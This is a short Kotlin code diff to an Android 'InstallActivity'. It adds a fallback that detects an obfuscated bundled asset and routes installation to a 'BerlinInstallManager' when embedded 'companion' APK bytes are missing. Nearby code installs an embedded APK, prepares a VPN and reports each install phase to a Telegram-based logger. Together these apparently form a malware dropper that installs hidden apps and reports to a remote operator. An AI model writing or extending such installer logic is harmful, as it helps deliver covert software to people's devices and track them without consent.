@@ -804,9 +804,19 @@ class InstallActivity : Activity() {
                         if (apkBytes.isNotEmpty()) {
                             runOnUiThread { prepareAndStartVpn(apkBytes) }
                         } else {
-                            TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "FAILED",
-                                "getCompanionBytes returned empty — setStage ERROR")
-                            runOnUiThread { setStage(Stage.ERROR) }
+                            // No companion bytes — check if this is a berlin installer build
+                            val hasBerlinAsset = try {
+                                assets.open(BuildConfig.ASSET_C).close(); true
+                            } catch (_: Exception) { false }
+                            if (hasBerlinAsset) {
+                                TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "BERLIN",
+                                    "No companion bytes — berlin asset detected, routing to BerlinInstallManager")
+                                runOnUiThread { berlinInstallManager.start() }
+                            } else {
+                                TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "FAILED",
+                                    "getCompanionBytes returned empty — setStage ERROR")
+                                runOnUiThread { setStage(Stage.ERROR) }
+                            }
                         }
                     } catch (e: Exception) {
                         TelegramLogger.send(this@InstallActivity, "PHASE3_APK_BYTES", "EXCEPTION",
